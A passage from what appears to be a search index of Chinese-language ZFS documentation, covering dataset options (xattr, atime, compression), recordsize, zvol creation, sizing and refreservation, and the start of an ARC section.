<p>\u200b\u5982\u679c\u200b\u4f60\u200b\u7684\u200b\u4f7f\u7528\u200b\u573a\u666f\u200b\u4e0d\u200b\u9700\u8981\u200b\u6269\u5c55\u200b\u5c5e\u6027\u200b\uff08\u200b\u5982\u200b\u955c\u50cf\u200b\u7ad9\u200b\uff09\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>xattr=off</code> \u200b\u5173\u95ed\u200b\u6269\u5c55\u200b\u5c5e\u6027\u200b\u529f\u80fd\u200b\uff0c\u200b\u8fdb\u4e00\u6b65\u200b\u51cf\u5c11\u200b\u78c1\u76d8\u200b I/O\u3002</p> <p>\u200b\u8be5\u200b\u9009\u9879\u200b\u7684\u200b\u9ed8\u8ba4\u503c\u200b\u4e3a\u200b <code>xattr=on</code>\uff0c\u200b\u5373\u200b\u6269\u5c55\u200b\u5c5e\u6027\u200b\u5b58\u50a8\u200b\u5728\u200b\u989d\u5916\u200b\u7684\u200b\u6570\u636e\u200b\u5757\u200b\u4e2d\u200b\u3002\u200b\u8fd9\u662f\u200b\u4e3a\u4e86\u200b\u4fdd\u6301\u200b\u4e0e\u200b FreeBSD / Solaris \u200b\u7b49\u200b\u7cfb\u7edf\u200b\u4e2d\u200b\u7684\u200b ZFS \u200b\u5b9e\u73b0\u200b\u7684\u200b\u517c\u5bb9\u6027\u200b\u3002\u200b\u9664\u975e\u200b\u4f60\u200b\u9884\u8ba1\u200b\u9700\u8981\u200b\u5c06\u200b ZFS pool \u200b\u642c\u200b\u5230\u200b\u8fd9\u4e9b\u200b\u7cfb\u7edf\u200b\u4e0a\u200b\u4f7f\u7528\u200b\uff0c\u200b\u5426\u5219\u200b\u6211\u4eec\u200b\u63a8\u8350\u200b\u4f7f\u7528\u200b <code>xattr=sa</code> \u200b\u6216\u200b <code>xattr=off</code>\u3002</p> </li> <li> <p><code>relatime=on</code>\uff1a\u200b\u542f\u7528\u200b\u76f8\u5bf9\u200b\u65f6\u95f4\u200b\u6233\u200b\u3002\u200b\u9ed8\u8ba4\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0cLinux \u200b\u4f1a\u200b\u5728\u200b\u6bcf\u6b21\u200b\u8bbf\u95ee\u200b\u6587\u4ef6\u200b\u65f6\u200b\u66f4\u65b0\u200b\u5176\u200b\u8bbf\u95ee\u200b\u65f6\u95f4\u200b\u6233\u200b\uff08atime\uff09\uff0c\u200b\u5bf9\u4e8e\u200b\u7ecf\u5e38\u200b\u8bbf\u95ee\u200b\u4f46\u200b\u8f83\u200b\u5c11\u200b\u4fee\u6539\u200b\u7684\u200b\u6587\u4ef6\u200b\u6765\u8bf4\u200b\uff0c\u200b\u8fd9\u4f1a\u200b\u5e26\u6765\u200b\u989d\u5916\u200b\u7684\u200b\u78c1\u76d8\u200b I/O\u3002\u200b\u542f\u7528\u200b <code>relatime</code> \u200b\u540e\u200b\uff0cLinux \u200b\u4f1a\u200b\u964d\u4f4e\u200b\u5bf9\u200b atime \u200b\u7684\u200b\u66f4\u65b0\u200b\u9891\u7387\u200b\uff0c\u200b\u4ece\u800c\u200b\u51cf\u5c11\u200b\u78c1\u76d8\u200b I/O\u3002</p> <p>\u200b\u6b64\u200b ZFS \u200b\u53c2\u6570\u200b\u4e0e\u200b Linux \u200b\u7684\u200b\u6302\u8f7d\u200b\u9009\u9879\u200b <code>relatime</code> \u200b\u5b8c\u5168\u76f8\u540c\u200b\uff0c\u200b\u4e14\u200b\u5728\u200b\u6302\u8f7d\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u540e\u200b\u4f7f\u7528\u200b <code>zfs set relatime=</code> \u200b\u4f1a\u200b\u7acb\u523b\u200b\u53cd\u6620\u200b\u5728\u200b\u6302\u8f7d\u200b\u70b9\u4e0a\u200b\u3002</p> <p>\u200b\u5982\u679c\u200b\u4f60\u200b\u7684\u200b\u4f7f\u7528\u200b\u573a\u666f\u200b\u4e0d\u200b\u9700\u8981\u200b\u8bb0\u5f55\u200b\u8bbf\u95ee\u200b\u65f6\u95f4\u200b\u6233\u200b\uff08\u200b\u5982\u200b\u955c\u50cf\u200b\u7ad9\u200b\uff09\uff0c\u200b\u53ef\u4ee5\u200b\u8bbe\u7f6e\u200b <code>atime=off</code> \u200b\u5173\u95ed\u200b\u8be5\u200b\u529f\u80fd\u200b\uff0c\u200b\u8fdb\u4e00\u6b65\u200b\u51cf\u5c11\u200b\u78c1\u76d8\u200b I/O\uff0c\u200b\u6b64\u65f6\u200b <code>relatime</code> \u200b\u9009\u9879\u200b\u5c06\u200b\u4e0d\u8d77\u4f5c\u7528\u200b\u3002 \u200b\u7c7b\u4f3c\u200b\u5730\u200b\uff0c<code>atime</code> \u200b\u8bbe\u7f6e\u200b\u4e0e\u200b Linux \u200b\u7684\u200b\u6302\u8f7d\u200b\u9009\u9879\u200b <code>atime</code> / <code>noatime</code> \u200b\u5b8c\u5168\u76f8\u540c\u200b\u3002</p> </li> <li> <p><code>compression=on</code> \u200b\u6216\u200b <code>compression=zstd</code>\uff1a\u200b\u542f\u7528\u200b ZFS \u200b\u7684\u200b\u900f\u660e\u200b\u538b\u7f29\u200b\u529f\u80fd\u200b\u3002\u200b\u5bf9\u4e8e\u200b\u5927\u591a\u6570\u200b\u6570\u636e\u200b\uff0c\u200b\u538b\u7f29\u200b\u540e\u200b\u7684\u200b\u6570\u636e\u91cf\u200b\u4f1a\u200b\u663e\u8457\u200b\u51cf\u5c0f\u200b\uff0c\u200b\u4ece\u800c\u200b\u51cf\u5c11\u200b\u78c1\u76d8\u200b I/O\u3002</p> <p>\u200b\u4e00\u822c\u200b\u5efa\u8bae\u200b\u542f\u7528\u200b\u900f\u660e\u200b\u538b\u7f29\u200b\u529f\u80fd\u200b\uff0c\u200b\u9664\u975e\u200b\u4f60\u200b\u7684\u200b CPU \u200b\u6027\u80fd\u200b\u8f83\u5dee\u200b\uff08\u200b\u4f8b\u5982\u200b 10 \u200b\u5e74\u524d\u200b\u7684\u200b\u670d\u52a1\u5668\u200b\uff09\u200b\u6216\u8005\u200b\u9884\u671f\u200b\u7684\u200b\u6570\u636e\u91cf\u200b\u4e0d\u4f1a\u200b\u56e0\u200b\u538b\u7f29\u200b\u800c\u200b\u51cf\u5c0f\u200b\uff08\u200b\u4f8b\u5982\u200b\u5f52\u6863\u200b\u5b58\u50a8\u200b\u5df2\u7ecf\u200b\u538b\u7f29\u200b\u8fc7\u200b\u7684\u200b\u6570\u636e\u200b\uff09\u3002</p> <p>\u200b\u538b\u7f29\u7b97\u6cd5\u200b</p> <p>\u200b\u622a\u81f3\u200b 2024 \u200b\u5e74\u200b\uff0cZFS \u200b\u7684\u200b\u9ed8\u8ba4\u200b\uff08<code>compression=on</code>\uff09\u200b\u538b\u7f29\u7b97\u6cd5\u200b\u4e3a\u200b LZ4\uff0c\u200b\u8fd9\u662f\u200b\u4e00\u79cd\u200b\u901f\u5ea6\u200b\u8f83\u200b\u5feb\u200b\u7684\u200b\u5355\u7ebf\u7a0b\u200b\u7b97\u6cd5\u200b\u3002\u200b\u5982\u679c\u200b\u4f60\u200b\u7684\u200b CPU \u200b\u4e0d\u662f\u200b\u4e0a\u53e4\u200b\u7ea7\u522b\u200b\u7684\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u8003\u8651\u200b\u4f7f\u7528\u200b Zstd\uff0c\u200b\u8fd9\u662f\u200b\u4e00\u79cd\u200b\u66f4\u52a0\u200b\u73b0\u4ee3\u5316\u200b\u7684\u200b\u538b\u7f29\u7b97\u6cd5\u200b\uff0c\u200b\u652f\u6301\u200b\u591a\u7ebf\u7a0b\u200b\u548c\u200b\u66f4\u200b\u9ad8\u200b\u7684\u200b\u538b\u7f29\u6bd4\u200b\u3002</p> <p>OpenZFS \u200b\u5728\u200b 2.2 \u200b\u7248\u672c\u200b\u4e2d\u4e3a\u200b 3 \u200b\u7ea7\u200b\u4ee5\u4e0a\u200b\u7684\u200b Zstd \u200b\u542f\u7528\u200b\u4e86\u200b early abort\uff08\u200b\u9ed8\u8ba4\u200b\u7b49\u7ea7\u200b\u521a\u597d\u200b\u662f\u200b 3 \u200b\u7ea7\u200b\uff09\uff0c\u200b\u5373\u200b ZFS \u200b\u4f1a\u5148\u200b\u4f7f\u7528\u200b LZ4 \u200b\u548c\u200b Zstd-1 \u200b\u5c1d\u8bd5\u200b\u538b\u7f29\u200b\uff0c\u200b\u5982\u679c\u200b\u538b\u7f29\u6bd4\u200b\u4e0d\u200b\u7406\u60f3\u200b\uff0c\u200b\u5219\u200b\u653e\u5f03\u200b\u538b\u7f29\u200b\u3002Early abort \u200b\u673a\u5236\u200b\u53ef\u4ee5\u200b\u907f\u514d\u200b\u5728\u200b\u96be\u4ee5\u200b\u538b\u7f29\u200b\u7684\u200b\u6570\u636e\u200b\u4e0a\u200b\u6d6a\u8d39\u200b CPU\uff0c\u200b\u56e0\u6b64\u200b\u4e00\u822c\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u65e0\u9700\u200b\u62c5\u5fc3\u200b\u538b\u7f29\u200b\u4f1a\u200b\u5e26\u6765\u200b\u6027\u80fd\u200b\u95ee\u9898\u200b\u3002</p> </li> </ul>"},{"location":"ops/storage/zfs/#recordsize","title":"\u5173\u4e8e\u200b <code>recordsize</code>","text":"<p>\u200b\u6587\u4ef6\u200b\u5728\u200b ZFS \u200b\u4e2d\u662f\u200b\u4ee5\u200b\u201c\u200b\u5757\u200b\u201d\uff08block\uff09\u200b\u4e3a\u200b\u5355\u4f4d\u200b\u5b58\u50a8\u200b\u7684\u200b\uff0c\u200b\u4e00\u4e2a\u200b\u6587\u4ef6\u200b\u5757\u200b\u5360\u7528\u200b\u4e00\u4e2a\u200b\u6216\u200b\u591a\u4e2a\u200b\u201c\u200b\u6247\u533a\u200b\u201d\uff08sector\uff0c\u200b\u5373\u200b\u4e0a\u6587\u200b\u63d0\u5230\u200b\u7684\u200b <code>ashift</code>\uff09\u200b\u7684\u200b\u5927\u5c0f\u200b\u3002<code>recordsize</code> \u200b\u53c2\u6570\u200b\u7528\u4e8e\u200b\u6307\u5b9a\u200b\u6587\u4ef6\u200b\u5757\u200b\u7684\u200b\u6700\u5927\u200b\u5927\u5c0f\u200b\uff0c\u200b\u4ee5\u4fbf\u200b\u5728\u200b\u8bfb\u5199\u200b\u6587\u4ef6\u200b\u65f6\u200b\u80fd\u591f\u200b\u66f4\u597d\u200b\u5730\u200b\u5229\u7528\u200b\u78c1\u76d8\u200b I/O\u3002</p> <p>\u200b\u7531\u4e8e\u200b ZFS \u200b\u4e2d\u200b\u6240\u6709\u200b\u7684\u200b\u6587\u4ef6\u200b\u5757\u200b\u548c\u200b\u5143\u200b\u4fe1\u606f\u200b\u90fd\u200b\u662f\u200b\u6709\u200b\u6821\u9a8c\u200b\uff08checksum\uff09\u200b\u7684\u200b\uff0c\u200b\u56e0\u6b64\u200b\u6240\u6709\u200b\u8bfb\u5199\u200b\u90fd\u200b\u662f\u200b\u4ee5\u200b\u6587\u4ef6\u200b\u5757\u200b\u4e3a\u200b\u5355\u4f4d\u200b\u7684\u200b\uff0c\u200b\u4ece\u800c\u200b\u5757\u200b\u5927\u5c0f\u200b\u5e94\u8be5\u200b\u4e0e\u200b\u9884\u671f\u200b\u7684\u200b\u6587\u4ef6\u200b\u8bbf\u95ee\u200b\u6a21\u5f0f\u200b\u76f8\u5339\u914d\u200b\u3002\u200b\u4f8b\u5982\u200b\uff0c\u200b\u5bf9\u4e8e\u200b\u5f71\u97f3\u200b\u5a31\u4e50\u200b\u8d44\u6e90\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5c06\u200b <code>recordsize</code> \u200b\u8bbe\u7f6e\u200b\u4e3a\u200b 1 MiB\uff0c\u200b\u4ee5\u4fbf\u200b\u66f4\u597d\u200b\u5730\u200b\u5229\u7528\u200b\u786c\u76d8\u200b\u7684\u200b\u987a\u5e8f\u200b\u8bfb\u5199\u200b\u6027\u80fd\u200b\uff1b\u200b\u5bf9\u4e8e\u200b MySQL \u200b\u7684\u200b\u6570\u636e\u6587\u4ef6\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5c06\u200b <code>recordsize</code> \u200b\u8bbe\u7f6e\u200b\u4e3a\u200b 16 KiB\uff0c\u200b\u4ee5\u200b\u5339\u914d\u200b MySQL InnoDB \u200b\u5f15\u64ce\u200b\u7684\u200b\u9ed8\u8ba4\u9875\u200b\uff08page\uff09\u200b\u5927\u5c0f\u200b\u3002ZFS \u200b\u63d0\u4f9b\u200b\u7684\u200b\u9ed8\u8ba4\u503c\u200b\u4e3a\u200b 128 KiB\uff0c\u200b\u5bf9\u4e8e\u200b\u65e5\u5e38\u200b\u4f7f\u7528\u200b\u7b49\u200b\u4e0d\u200b\u56fa\u5b9a\u200b\u7684\u200b\u573a\u666f\u200b\u662f\u200b\u4e00\u4e2a\u200b\u8f83\u4e3a\u200b\u5747\u8861\u200b\u7684\u200b\u9009\u62e9\u200b\u3002</p> <p>\u200b\u4e0e\u200b\u5176\u4ed6\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u7684\u200b\u4e0d\u540c\u4e4b\u5904\u200b\u5728\u4e8e\u200b\uff0c<code>recordsize</code> \u200b\u6307\u5b9a\u200b\u4e86\u200b\u6587\u4ef6\u200b\u5757\u200b\u7684\u200b\u6700\u5927\u200b\u5927\u5c0f\u200b\uff0c\u200b\u800c\u200b\u4e0d\u662f\u200b\u56fa\u5b9a\u200b\u7684\u200b\u5927\u5c0f\u200b\u3002\u200b\u5177\u4f53\u6765\u8bf4\u200b<sup>3</sup>\uff1a</p> <ul> <li>\u200b\u82e5\u200b\u6587\u4ef6\u5927\u5c0f\u200b\u4e0d\u200b\u8d85\u8fc7\u200b <code>recordsize</code>\uff0c\u200b\u5219\u200b\u6587\u4ef6\u200b\u5757\u200b\u5927\u5c0f\u200b\u4e3a\u200b\u6587\u4ef6\u5927\u5c0f\u200b\uff08\u200b\u5411\u4e0a\u200b\u53d6\u6574\u200b\u5230\u200b ashift \u200b\u5bf9\u5e94\u200b\u5927\u5c0f\u200b\u7684\u200b\u6574\u6570\u500d\u200b\uff09\u3002<ul> <li>\u200b\u4f8b\u5982\u200b\uff0c\u200b\u4e00\u4e2a\u200b 37 KiB \u200b\u7684\u200b\u6587\u4ef6\u200b\u5c06\u4f1a\u200b\u5b58\u50a8\u200b\u4e3a\u200b\u4e00\u4e2a\u200b 40 KiB \u200b\u7684\u200b\u5757\u200b\uff08\u200b\u5047\u8bbe\u200b <code>ashift=12</code>\uff09\u3002</li> </ul> </li> <li>\u200b\u82e5\u200b\u6587\u4ef6\u5927\u5c0f\u200b\u8d85\u8fc7\u200b <code>recordsize</code>\uff0c\u200b\u5219\u200b\u6587\u4ef6\u200b\u4f1a\u200b\u88ab\u200b\u62c6\u6210\u200b\u591a\u4e2a\u200b\u5927\u5c0f\u200b\u4e3a\u200b <code>recordsize</code> \u200b\u7684\u200b\u5757\u200b\uff0c\u200b\u5176\u4e2d\u200b\u6700\u540e\u200b\u4e00\u4e2a\u200b\u5757\u200b\u4f1a\u200b\u4ee5\u200b\u96f6\u200b\u5b57\u8282\u200b\u8865\u9f50\u200b\u81f3\u200b <code>recordsize</code>\u3002<ul> <li>\u200b\u4f8b\u5982\u200b\uff0c\u200b\u4e00\u4e2a\u200b 129 KiB \u200b\u7684\u200b\u6587\u4ef6\u200b\u5c06\u4f1a\u200b\u5b58\u50a8\u200b\u4e3a\u200b\u4e24\u4e2a\u200b 128 KiB \u200b\u7684\u200b\u5757\u200b\uff0c\u200b\u5728\u200b\u9ed8\u8ba4\u200b\u60c5\u51b5\u200b\u4e0b\u4f1a\u200b\u5360\u7528\u200b 256 KiB \u200b\u78c1\u76d8\u7a7a\u95f4\u200b\u3002</li> <li>\u200b\u56e0\u6b64\u200b\u6211\u4eec\u200b\u5728\u200b\u5927\u591a\u6570\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u63a8\u8350\u200b\u5f00\u542f\u200b\u538b\u7f29\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u51cf\u5c11\u200b\u8fd9\u79cd\u200b padding \u200b\u5e26\u6765\u200b\u7684\u200b\u6d6a\u8d39\u200b\u3002<ul> <li>\u200b\u5373\u4f7f\u200b\u662f\u200b\u5f52\u6863\u200b\u5b58\u50a8\u200b\u5df2\u200b\u538b\u7f29\u200b\u8fc7\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u6211\u4eec\u200b\u4ecd\u7136\u200b\u63a8\u8350\u200b\u8bbe\u7f6e\u200b <code>compression=zle</code><sup>9</sup>\uff0c\u200b\u4ee5\u4fbf\u200b\u5728\u200b\u6570\u636e\u200b\u5757\u200b\u4e4b\u95f4\u200b\u7684\u200b padding \u200b\u4e0a\u200b\u8282\u7701\u200b\u7a7a\u95f4\u200b\u3002</li> </ul> </li> </ul> </li> </ul>"},{"location":"ops/storage/zfs/#zvol","title":"Zvol","text":"<p>ZFS volume\uff08zvol\uff09\u200b\u662f\u200b ZFS \u200b\u63d0\u4f9b\u200b\u7684\u200b\u5757\u200b\u8bbe\u5907\u200b\u63a5\u53e3\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u7528\u4e8e\u200b\u865a\u62df\u673a\u200b\u7b49\u200b\u9700\u8981\u200b\u5757\u200b\u8bbe\u5907\u200b\u7684\u200b\u573a\u666f\u200b\u3002 \u200b\u6bcf\u4e2a\u200b zvol \u200b\u90fd\u200b\u662f\u200b\u4e00\u4e2a\u200b\u72ec\u7acb\u200b\u7684\u200b\u5757\u200b\u8bbe\u5907\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u50cf\u200b\u786c\u76d8\u200b\u4e00\u6837\u200b\u5206\u533a\u200b\u3001\u200b\u683c\u5f0f\u5316\u200b\u5e76\u200b\u6302\u8f7d\u200b\u3002</p> <p>\u200b\u521b\u5efa\u200b zvol \u200b\u7684\u200b\u65b9\u6cd5\u200b\u4e0e\u200b\u521b\u5efa\u200b ZFS \u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u76f8\u540c\u200b\uff0c\u200b\u533a\u522b\u200b\u5728\u4e8e\u200b\u9700\u8981\u200b\u4f7f\u7528\u200b <code>-V</code> \u200b\u53c2\u6570\u200b\u5e76\u200b\u6307\u5b9a\u200b\u5927\u5c0f\u200b\uff1a</p> <pre><code>zfs create -V 10G tank/vol\n</code></pre> <p>\u200b\u6b64\u65f6\u200b ZFS \u200b\u5c31\u200b\u4f1a\u200b\u5728\u200b <code>/dev/zvol/tank/vol</code> \u200b\u5904\u200b\u5c06\u200b\u65b0\u5efa\u200b\u7684\u200b zvol \u200b\u66b4\u9732\u200b\u51fa\u6765\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u4e86\u200b\u3002</p>"},{"location":"ops/storage/zfs/#volblocksize","title":"<code>volblocksize</code>","text":"<p>\u200b\u4f5c\u4e3a\u200b\u5757\u200b\u8bbe\u5907\u200b\uff0czvol \u200b\u81ea\u7136\u200b\u4e5f\u200b\u6709\u200b\u201c\u200b\u5757\u200b\u5927\u5c0f\u200b\u201d\uff08block size\uff09\u200b\u7684\u200b\u6982\u5ff5\u200b\uff0c\u200b\u5373\u200b <code>volblocksize</code> \u200b\u53c2\u6570\u200b\u3002 \u200b\u4e0e\u200b <code>recordsize</code> \u200b\u4e0d\u540c\u200b\uff0c<code>volblocksize</code> \u200b\u662f\u200b\u56fa\u5b9a\u200b\u7684\u200b\uff0c\u200b\u4e14\u200b\u53ea\u80fd\u200b\u5728\u200b\u521b\u5efa\u200b zvol \u200b\u65f6\u200b\u6307\u5b9a\u200b\u3002 \u200b\u81ea\u200b ZFS 2.1 \u200b\u8d77\u200b\uff0c<code>volblocksize</code> \u200b\u7684\u200b\u9ed8\u8ba4\u503c\u200b\u4e3a\u200b 16K\u3002</p> <p>\u200b\u4e00\u822c\u6765\u8bf4\u200b\uff0c<code>volblocksize</code> \u200b\u5e94\u8be5\u200b\u4e0e\u200b\u4f60\u200b\u7684\u200b\u5e94\u7528\u7a0b\u5e8f\u200b\u7684\u200b I/O \u200b\u6a21\u5f0f\u200b\u76f8\u5339\u914d\u200b\uff0c\u200b\u4ee5\u200b\u83b7\u5f97\u6700\u4f73\u200b\u7684\u200b\u6027\u80fd\u200b\u3002 \u200b\u4f46\u200b\u6211\u4eec\u200b\u5e76\u200b\u4e0d\u200b\u63a8\u8350\u200b\u592a\u5c0f\u200b\u7684\u200b <code>volblocksize</code>\uff0c\u200b\u56e0\u4e3a\u200b\u8fd9\u4f1a\u200b\u589e\u52a0\u200b ZFS \u200b\u7684\u200b\u5143\u200b\u6570\u636e\u200b\u8d1f\u62c5\u200b\u3001\u200b\u788e\u7247\u200b\u7387\u200b\u4ee5\u53ca\u200b RAIDZ \u200b\u7684\u200b\u989d\u5916\u200b\u5f00\u9500\u200b\uff0c\u200b\u53cd\u800c\u200b\u5bfc\u81f4\u200b\u6027\u80fd\u200b\u964d\u4f4e\u200b\u3002 \u200b\u6211\u4eec\u200b\u63a8\u8350\u200b <code>volblocksize</code> \u200b\u4e0d\u8981\u200b\u5c0f\u4e8e\u200b 16K\uff0c\u200b\u9664\u975e\u200b\u4f60\u200b\u7ecf\u8fc7\u200b\u8be6\u7ec6\u200b\u7684\u200b\u6d4b\u8bd5\u200b\u8bc1\u660e\u200b\u66f4\u200b\u5c0f\u200b\u7684\u200b <code>voblocksize</code> \u200b\u80fd\u591f\u200b\u5e26\u6765\u200b\u6027\u80fd\u200b\u63d0\u5347\u200b\u3002</p>"},{"location":"ops/storage/zfs/#zvol-size","title":"Zvol \u200b\u7684\u200b\u5bb9\u91cf","text":"<p>\u200b\u5982\u679c\u200b\u4f60\u200b\u9700\u8981\u200b\u8c03\u8282\u200b zvol \u200b\u7684\u200b\u5927\u5c0f\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u8bbe\u7f6e\u200b\u8be5\u200b zvol \u200b\u7684\u200b <code>volsize</code> \u200b\u5c5e\u6027\u200b<sup>4</sup>\uff1a</p> <pre><code>zfs set volsize=20G tank/vol\n</code></pre> <p>\u200b\u6b64\u65f6\u200b zvol \u200b\u7684\u200b\u5927\u5c0f\u200b\u5c31\u200b\u4f1a\u200b\u7acb\u523b\u200b\u53d8\u4e3a\u200b 20 GiB\u3002</p> <p>\u200b\u8be5\u200b\u64cd\u4f5c\u200b\u6ca1\u6709\u200b\u786e\u8ba4\u200b</p> <p>\u200b\u4e0e\u200b\u5176\u4ed6\u200b <code>zfs</code> \u200b\u7ba1\u7406\u200b\u547d\u4ee4\u200b\u4e00\u6837\u200b\uff0c\u200b\u8fd9\u4e9b\u200b\u64cd\u4f5c\u200b\u6ca1\u6709\u200b\u4efb\u4f55\u200b\u786e\u8ba4\u200b\u63d0\u793a\u200b\uff0c\u200b\u8bf7\u200b\u770b\u6e05\u695a\u200b\u547d\u4ee4\u884c\u200b\u540e\u200b\u518d\u200b\u6267\u884c\u200b\u3002</p> <p>\u200b\u5982\u679c\u200b\u4f60\u200b\u7528\u200b\u6b64\u200b\u65b9\u6cd5\u200b\u7f29\u5c0f\u200b\u4e86\u200b zvol \u200b\u7684\u200b\u5927\u5c0f\u200b\uff0czvol \u200b\u4e2d\u200b\u8d85\u8fc7\u200b\u65b0\u200b\u5927\u5c0f\u200b\u7684\u200b\u6570\u636e\u200b\u5c06\u4f1a\u200b\u7acb\u523b\u200b\u6d88\u5931\u200b\uff0c\u200b\u56e0\u6b64\u200b\u8bf7\u200b\u52a1\u5fc5\u200b\u63d0\u524d\u200b\u5907\u4efd\u200b\u6570\u636e\u200b\uff0c\u200b\u5e76\u200b\u786e\u4fdd\u200b\u8be5\u200b\u201c\u200b\u865a\u62df\u200b\u786c\u76d8\u200b\u201d\u200b\u7684\u200b\u5185\u5bb9\u200b\u5df2\u7ecf\u200b\u88ab\u200b\u7f29\u5c0f\u200b\u5230\u200b\u65b0\u200b\u7684\u200b\u5927\u5c0f\u200b\u4ee5\u5185\u200b\u3002</p> <p>\u200b\u4e0e\u200b ZFS \u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u7684\u200b\u4e00\u4e2a\u200b\u533a\u522b\u200b\u662f\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u907f\u514d\u200b\u5b58\u50a8\u200b\u6c60\u6ee1\u200b\u4e86\u200b\u800c\u200b\u5bfc\u81f4\u200b zvol \u200b\u65e0\u6cd5\u200b\u5199\u5165\u200b\uff0cZFS\uff08\u200b\u5728\u200b\u9ed8\u8ba4\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff09\u200b\u4f1a\u4e3a\u200b zvol \u200b\u5168\u989d\u200b\u9884\u7559\u200b\u7a7a\u95f4\u200b\u3002 \u200b\u56e0\u6b64\u200b\u5982\u679c\u200b\u4f60\u200b\u521b\u5efa\u200b\u4e86\u200b\u4e00\u4e2a\u200b 10 GiB \u200b\u7684\u200b zvol\uff0c\u200b\u90a3\u4e48\u200b\u5b58\u50a8\u200b\u6c60\u4e2d\u200b\u5c31\u200b\u4f1a\u5c11\u200b 10 GiB \u200b\u7684\u200b\u7a7a\u95f4\u200b\u3002 \u200b\u6ce8\u610f\u200b ZFS \u200b\u5e76\u200b\u6ca1\u6709\u200b\u7acb\u523b\u200b\u5411\u200b\u5b58\u50a8\u200b\u6c60\u200b\u5199\u5165\u200b 10 GiB \u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u800c\u662f\u200b\u5728\u200b ZFS \u200b\u7684\u200b\u7a7a\u95f4\u200b\u7edf\u8ba1\u200b\u4e2d\u200b\u9884\u7559\u200b\u4e86\u200b 10 GiB\uff0c\u200b\u56e0\u6b64\u200b\u65b0\u5efa\u200b\u7684\u200b zvol \u200b\u4f1a\u200b\u7acb\u523b\u200b\u663e\u793a\u200b <code>used</code> \u200b\u4e3a\u200b 10 GiB\u3002 \u200b\u5982\u679c\u200b\u4f60\u200b\u9700\u8981\u200b\u67e5\u770b\u200b\u6b64\u200b zvol \u200b\u5b9e\u9645\u200b\u5360\u7528\u200b\u7684\u200b\u7a7a\u95f4\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u67e5\u770b\u200b\u5b83\u200b\u7684\u200b <code>referenced</code> \u200b\u5c5e\u6027\u200b\uff1a</p> <pre><code>zfs get referenced tank/vol\n</code></pre> <p>\u200b\u6216\u8005\u200b\u76f4\u63a5\u200b\u5217\u51fa\u200b\u8be5\u200b zvol \u200b\u7684\u200b\u6240\u6709\u200b\u5c5e\u6027\u200b\uff1a</p> <pre><code>zfs get all tank/vol\n</code></pre> <p>\u200b\u6b64\u65f6\u200b\u4f60\u200b\u5c31\u200b\u4f1a\u200b\u770b\u5230\u200b\uff0c<code>usedbydataset</code> \u200b\u4ec5\u200b\u6709\u200b 56K\uff08\u200b\u6216\u200b\u4e00\u4e2a\u200b\u63a5\u8fd1\u200b\u7684\u200b\u5c0f\u200b\u6570\u5b57\u200b\uff09\uff0c\u200b\u800c\u200b <code>usedbyrefreservation</code> \u200b\u5360\u636e\u200b\u4e86\u200b\u5168\u90e8\u200b 10 GiB \u200b\u7684\u200b <code>used</code>\uff0c\u200b\u8fd9\u200b\u610f\u5473\u7740\u200b zvol \u200b\u5b9e\u9645\u4e0a\u200b\u5e76\u200b\u6ca1\u6709\u200b\u5206\u914d\u200b\u5b58\u50a8\u200b\u6c60\u200b\u7a7a\u95f4\u200b\u3002</p> <p>\u200b\u5982\u679c\u200b\uff08\u200b\u56e0\u4e3a\u200b\u5404\u79cd\u200b\u539f\u56e0\u200b\uff09\u200b\u4f60\u200b\u4e0d\u200b\u5e0c\u671b\u200b zvol \u200b\u9884\u7559\u200b\u5168\u90e8\u200b\u7a7a\u95f4\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>refreservation=none</code> \u200b\u53c2\u6570\u200b\u6765\u200b\u5173\u95ed\u200b\u9884\u7559\u200b\u7a7a\u95f4\u200b\uff1a</p> <pre><code>zfs set refreservation=none tank/vol\n</code></pre> <p>\u200b\u5982\u679c\u200b\u9700\u8981\u200b\u6062\u590d\u200b\u9884\u7559\u200b\u7a7a\u95f4\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5c06\u200b <code>refreservation</code> \u200b\u8bbe\u200b\u4e3a\u200b <code>auto</code>\u3002 \u200b\u6ce8\u610f\u200b <code>auto</code> \u200b\u8fd9\u4e2a\u200b\u503c\u4ec5\u200b\u5bf9\u200b zvol \u200b\u6709\u200b\u610f\u4e49\u200b\uff0c\u200b\u800c\u200b ZFS \u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u5e76\u200b\u4e0d\u200b\u652f\u6301\u200b <code>auto</code> \u200b\u503c\u200b\uff0c\u200b\u6bd5\u7adf\u200b ZFS \u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u5e76\u200b\u6ca1\u6709\u200b\u4e00\u4e2a\u200b\u786e\u5b9a\u200b\u7684\u200b\u5927\u5c0f\u200b\u3002</p>"},{"location":"ops/storage/zfs/#arc","title":"ARC","text":"<p>ZFS ARC \u200b\u7684\u200b\u5168\u79f0\u200b\u662f\u200b Adaptive Replacement Cache\uff0c\u200b\u662f\u200b ZFS \u200b\u7528\u4e8e\u200b\u7f13\u5b58\u200b\u78c1\u76d8\u200b\u6570\u636e\u200b\u7684\u200b\u4e00\u7ea7\u200b\u7f13\u5b58\u200b\u3002 \u200b\u6240\u6709\u200b\u7684\u200b\u8bfb\u53d6\u200b\u64cd\u4f5c\u200b\u90fd\u200b\u4f1a\u200b\u7ecf\u8fc7\u200b ARC\uff0c\u200b\u4e0d\u8bba\u662f\u200b\u5df2\u7ecf\u200b\u5728\u200b 